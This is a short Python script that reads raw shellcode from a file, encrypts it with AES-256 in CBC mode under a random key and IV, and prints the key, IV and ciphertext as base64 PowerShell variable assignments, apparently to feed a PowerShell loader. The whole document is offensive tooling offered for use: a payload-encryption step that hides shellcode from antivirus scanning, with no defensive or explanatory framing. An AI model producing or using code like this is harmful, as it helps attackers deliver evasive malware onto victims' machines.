from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os
import base64

# Generate a random 32-byte AES key
key = os.urandom(32)  # 256-bit key
iv = os.urandom(16)   # 128-bit IV

# Read the raw shellcode
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

# Encrypt shellcode using AES
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted_shellcode = cipher.encrypt(pad(shellcode, AES.block_size))

# Print key, IV, and encrypted shellcode in a PowerShell-friendly format
print(f"$key = [System.Convert]::FromBase64String('{base64.b64encode(key).decode()}');")
print(f"$iv = [System.Convert]::FromBase64String('{base64.b64encode(iv).decode()}');")
print(f"$encShellcode = [System.Convert]::FromBase64String('{base64.b64encode(encrypted_shellcode).decode()}');")
